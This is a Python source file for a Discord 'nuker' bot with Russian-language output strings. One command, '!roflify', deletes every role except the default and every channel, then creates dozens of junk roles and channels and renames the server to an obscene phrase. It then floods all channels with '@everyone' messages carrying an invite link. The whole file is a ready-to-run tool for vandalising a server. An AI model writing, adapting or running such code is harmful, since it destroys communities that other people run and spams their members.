import discord
from discord.ext import commands
import asyncio
import random
import time
from numba import njit

TOKEN = ""

intents = discord.Intents.all()
intents.webhooks = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Оно живое")


@bot.command()
async def roflify(ctx):
    guild = ctx.guild
    try:
        for role in guild.roles:
           if role != guild.default_role:
                await role.delete()
                print(f"Удалена роль {role.name}")
    except:
        print("не получилось удалить роль")
    for i in range(10):
            await guild.create_role(name="рофлер")
            print("Создана роль")

    for channel in guild.channels:
        await channel.delete()
        print(f"Удален канал {channel.name}")
    for i in range(25):
        q = random.uniform(10000, 99999)
        await guild.create_text_channel(f"мы-немного-рофлим-{q}")
        print("Создан канал")
        
    await guild.edit(name="СЕРВЕР ВЫЕБАН", icon=None)
    print("Изменено название и иконка")

    async def send_random_webhooks(guild):
        channels = list(guild.channels)
        random.shuffle(channels)
        for i in range(25):
            for channel in channels:
                await channel.send("@everyone ВАС ВЫЕБАЛИ\ndiscord.gg/DtwhthhG5N")
                print(f"Отправлено сообщение на {channel.name}")
                #time.sleep(random.uniform(0, 0))
    await send_random_webhooks(guild)

bot.run(TOKEN)


